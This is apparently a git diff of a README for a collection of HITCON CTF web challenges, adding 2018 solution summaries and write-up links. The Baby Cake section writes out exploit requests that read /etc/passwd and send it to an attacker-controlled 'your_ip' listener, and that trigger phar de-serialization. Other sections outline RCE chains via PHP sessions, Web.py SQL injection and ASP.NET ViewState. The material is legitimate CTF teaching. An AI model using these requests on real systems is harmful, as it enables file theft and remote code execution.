@@ -17,26 +17,20 @@ Finished Writeup:
 * [/hitcon-ctf-2017/ssrfme](https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/ssrfme)
 * [/hitcon-ctf-2017/baby^h-master-php-2017](https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017)
 
+
+**The ORIGINAL README is right below**
+
 --------
 
 My-CTF-Web-Challenges
 # My CTF Web Challenges
 
 
-Hi, I am Orange. This is the repo of CTF challenges I made. It contains challenge's source code, writeup and some idea explanation.  
-
-
-I am a CTFer and Bug Bounty Hunter, loving web hacking and penetration testing. So you will see these challs are all about web. If you have any question about these challs, you can find me in following ways  
-
-* orange@chroot.org   
-* [blog.orange.tw](http://blog.orange.tw/)   
-
-
-<br>
+This is the repo of CTF challenges I made, including the source code, write-up and idea explanation!
 Hope you like it :)  
 
 
-**P.s.** BTW, the series of `Babyfirst` are my favorite in all of these challenges. There are open questions to all and there are lots of creative solutions. If you don't have time to see all, please look the them at least!
+**P.s.** BTW, `Babyfirst` series are my favorite in all challenges. If you don't have time to see all, please look the them at least!
 
 * [Babyfirst](#babyfirst)  
 * [Babyfirst Revenge](#babyfirst-revenge)  
@@ -44,9 +38,24 @@ Hope you like it :)
 
 <br>
 
+You can contact me via:  
+* orange@chroot.org   
+* [blog.orange.tw](http://blog.orange.tw/)   
+* [@orange_8361](https://twitter.com/orange_8361)  
+
+<br>
+
+
 
 
 ## **Table of Content**
+
+* [HITCON 2018](#one-line-php-challenge)
+    * [One Line PHP Challenge](#one-line-php-challenge)
+    * [Baby Cake](#baby-cake)
+    * [Oh My Raddit](#oh-my-raddit)
+    * [Oh My Raddit v2](#oh-my-raddit-v2)
+    * [Why so Serials?](#why-so-serials)  
 
 * [HITCON 2017 Quals](#babyfirst-revenge)
     * [BabyFirst Revenge](#babyfirst-revenge)
@@ -81,6 +90,138 @@ Hope you like it :)
     * [SQLPWN](#sqlpwn)
     
 <br>
+
+## **One Line PHP Challenge**
+  
+Difficulty: **★★★★**  
+Solved: **3 / 1816**  
+Tag:   **PHP**
+
+#### Source Code
+
+* [index.php](hitcon-ctf-2018/one-line-php-challenge/src/index.php)  
+
+#### Solution
+
+P.S. This is a default installation PHP7.2 + Apache on Ubuntu 18.04
+
+1. Control partial session file content by `PHP_SESSION_UPLOAD_PROGRESS`
+2. Bypass `session.upload_progress.cleanup = On` by `race condition` or `slow query`
+3. Control the prefix to `@<?php` by chaining PHP wrappers
+
+* [exp_for_php.py](hitcon-ctf-2018/one-line-php-challenge/exp_for_php.py)
+* [Offical writeup for One Line PHP Challenge](http://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html)  
+
+#### Write Ups
+
+* [(English)One Line PHP Challenge](https://hackmd.io/s/B1A2JIjjm)  
+* [(中文)One Line PHP Challenge](https://hackmd.io/s/SkxOwAqiQ)  
+* [hitcon2018 One Line PHP Challenge](https://www.kingkk.com/2018/10/hitcon2018-One-Line-PHP-Challenge/)  
+* [hitcon 2018受虐笔记一:one-line-php-challenge 学习](http://wonderkun.cc/index.html/?p=718)  
+
+## **Baby Cake**
+  
+Difficulty: **★★★**  
+Solved: **4 / 1816**  
+Tag:   **Code Review**, **PHP**, **De-serialization**
+
+#### Source Code
+
+* [index.php](hitcon-ctf-2018/baby-cake-src/baby_cake.tgz)  
+
+#### Solution
+
+Due to the implement of **`CURLOPT_SAFE_UPLOAD`** in CakePHP `FormData.php`. We can read arbitrary files!
+
+```sh
+# arbitrary file read, listen port 12345 on your server
+http://13.230.134.135/
+?url=http://your_ip:12345/
+&data[x]=@/etc/passwd
+
+# arbitrary de-serialization the Monolog POP chain
+http://13.230.134.135/
+?url=http://your_ip:12345/
+&data[x]=@phar://../tmp/cache/mycache/[you_ip]/[md5_of_url]/body.cache
+```
+
+* [exploit.phar](hitcon-ctf-2018/baby-cake/exploit.phar)
+
+#### Write Ups
+
+* [Baby Cake](https://github.com/PDKT-Team/ctf/tree/master/hitcon2018/baby-cake)  
+* [Hitcon 2018 Web - Oh My Raddit / Baby Cake 题解](https://xz.aliyun.com/t/2961)  
+* [HITCON CTF 2018 Web WP 之 Baby Cake](https://xz.aliyun.com/t/3035)  
+
+## **Oh My Raddit**
+  
+Difficulty: **★★☆**  
+Solved: **27 / 1816**  
+Tag:   **Observation**, **DES checksum**, **Crypto**, **Web**
+
+#### Source Code
+
+* [app](hitcon-ctf-2018/oh-my-raddit/src/)  
+
+#### Solution
+
+1. Know `ECB` mode from block frequency analysis
+2. Know `block size = 8` from cipher length
+3. From the information above, it's reasonable to use `DES` in real world
+4. The most common block is `3ca92540eb2d0a42`(always in the cipher end). We can guess it's the padding `\x08\x08\x08\x08\x08\x08\x08\x08`
+5. Due to the checking parity in [DES](https://en.wikipedia.org/wiki/Data_Encryption_Standard), we can reduce the keyspace from 26(`abcdefghijklmnopqrstuvwxyz`) to 13(`acegikmoqsuwy`)
+    * Break in 1 second with `HashCat`
+    * Break in 10 minutes with single thread Python
+
+#### Write Ups
+
+* [Oh My Raddit](https://github.com/pwning/public-writeup/blob/e818115a2c3a5d18e8191d37b5c3151823d43126/hitcon2018/oh-my-raddit/README.md)  
+* [Oh my raddit](https://github.com/mdsnins/ctf-writeups/blob/b292621463b156d864bd2db062f31afe9aacb8d6/HITCON%202018/Oh%20my%20raddit.md)
+* [2018HITCON-Oh My Raddit&v2题解](https://mochazz.github.io/2018/10/25/2018HITCON-Oh%20My%20Raddit&v2%E9%A2%98%E8%A7%A3/)  
+
+## **Oh My Raddit v2**
+  
+Difficulty: **★★**  
+Solved: **10 / 1816**  
+Tag:   **Web.py**,  **SQL Injection to RCE**
+
+#### Source Code
+
+* [app](hitcon-ctf-2018/oh-my-raddit/src/)  
+
+#### Solution
+
+* Read the package version from `requirements.txt`
+* [Remote Code Execution in Web.py framework](https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/)
+
+* [exp.py](hitcon-ctf-2018/oh-my-raddit/exp.py)
+
+#### Write Ups
+
+* [Oh My Raddit V2](https://github.com/pwning/public-writeup/blob/c7273a8bd01710da0f2d9d9a3c8abe473b76bfde/hitcon2018/ohmyradditv2/README.md)
+* [Oh My Raddit v2](https://ctftime.org/writeup/11931)  
+* [2018HITCON-Oh My Raddit&v2题解](https://mochazz.github.io/2018/10/25/2018HITCON-Oh%20My%20Raddit&v2%E9%A2%98%E8%A7%A3/)  
+
+## **Why so Serials?**
+  
+Difficulty: **★★★★**  
+Solved: **1 / 1816**  
+Tag:   **De-serialization**, **RCE**, **ASP.NET**, **View State**
+
+#### Source Code
+
+* [Default.aspx](hitcon-ctf-2018/why-so-serials/src/Default.aspx)  
+
+#### Solution
+
+1. Get the `machineKey` in `web.config` by Server-Side-Includes(`.shtml` or `.stm`)
+2. Exploit `ASP.NET` `___VIEWSTATE` by [ysoserial.net](https://github.com/pwntester/ysoserial.net)
+
+#### Write Ups
+
+* [HITCON 2018: Why so Serials? Write-up](https://cyku.tw/ctf-hitcon-2018-why-so-serials/)  
+* [HITCON CTF 2018 - Why so Serials? Writeup](https://xz.aliyun.com/t/3019)  
+
 
 ## **BabyFirst Revenge**
   
